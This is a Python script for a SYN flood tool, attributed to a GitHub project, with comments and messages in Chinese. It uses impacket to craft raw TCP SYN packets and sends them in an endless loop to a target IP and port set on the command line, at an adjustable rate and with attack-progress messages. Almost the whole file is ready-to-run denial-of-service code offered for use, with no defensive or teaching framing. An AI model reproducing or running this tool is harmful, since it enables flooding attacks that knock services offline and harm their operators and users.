import time
import socket
import random
import argparse
import sys
import os
import impacket.ImpactPacket
import warnings
warnings.filterwarnings("ignore")
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year




def attack(dip, t, port=80):
    sent=0
    # 创建套接字
    sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
    count = 0
    while True:
        ip.contains(tcp)
        ip.calculate_checksum()
        sock.sendto(ip.get_packet(),(args.ip,args.port))#两个参数分别为要发送的数据，类型为bytes与包含目标ip与端口的元祖
        sent = sent + 1
        print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,args.ip,args.port))
        time.sleep((1000-args.speed)/2000)


if __name__ == "__main__":
    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(description="SYN Flooder (http://github.com/Gr3yPh/SYNFlooder) by GR3YPH_4NTOM")
    parser.add_argument("-ip", required=True, help="目标服务器的 IP 地址 (必填)")
    parser.add_argument("-lip", required=True, help="本机的 IP 地址 (必填)")
    parser.add_argument("-port", type=int, default=80, help="目标服务器的端口，默认为 80")
    parser.add_argument("-sport", type=int, default=12228, help="发送数据包的源端口，默认为 12228")
    parser.add_argument("-speed", type=int, default=1000, help="数据包发送速度，范围 1-1000，默认为 1000")

    # 解析参数
    args = parser.parse_args()

    # 检查 IP 参数是否为空
    if not args.ip or not args.lip:
        parser.print_help()
        sys.exit(1)

    ip = impacket.ImpactPacket.IP()
    tcp = impacket.ImpactPacket.TCP()
    
    ip.set_ip_src(args.lip)#你的ip
    ip.set_ip_dst(args.ip)#目标ip
    ip.set_ip_ttl(255)#ttl

    tcp.set_th_flags(0b00000010)#将syn标志位设为1
    tcp.set_th_sport(args.sport)#源端口
    tcp.set_th_dport(args.port)#目标端口
    tcp.set_th_ack(0)
    tcp.set_th_seq(22903)
    tcp.set_th_win(20000)#设置Window Size


    # 启动攻击
    print(f"攻击目标: IP = {args.ip}, Port = {args.port}, Speed = {args.speed}")
    attack(args.ip, args.speed, args.port)
